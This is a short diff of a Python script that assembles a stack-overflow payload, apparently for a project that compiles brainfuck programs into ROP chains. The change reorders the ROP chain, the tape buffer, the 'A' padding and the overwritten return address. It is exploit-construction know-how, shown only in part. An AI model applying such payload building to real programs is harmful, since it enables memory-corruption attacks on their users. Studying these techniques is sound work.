@@ -8,8 +8,8 @@ payload_max_size = 1000000
 tape_size = 30000
 
 initial_sp = 0x3fffffef80
-tape_start = initial_sp - payload_max_size
-rop_chain_start = tape_start + tape_size
+tape_start = initial_sp - tape_size
+rop_chain_start = initial_sp - payload_max_size
 
 # parse the brainfuck code
 
@@ -22,7 +22,7 @@ entry_point = p.get_entry_point()
 offset = b"A" * (payload_max_size - tape_size - len(rop_chain) + ra_offset)
 tape = b"\x00" * tape_size
 
-payload = tape + rop_chain + offset + entry_point
+payload = rop_chain + offset + tape + entry_point
 
 print(f"The payload has {len(payload)} bytes and can be found in the input.txt file")
 print(f"The rop_chain itself has {len(rop_chain)} bytes")
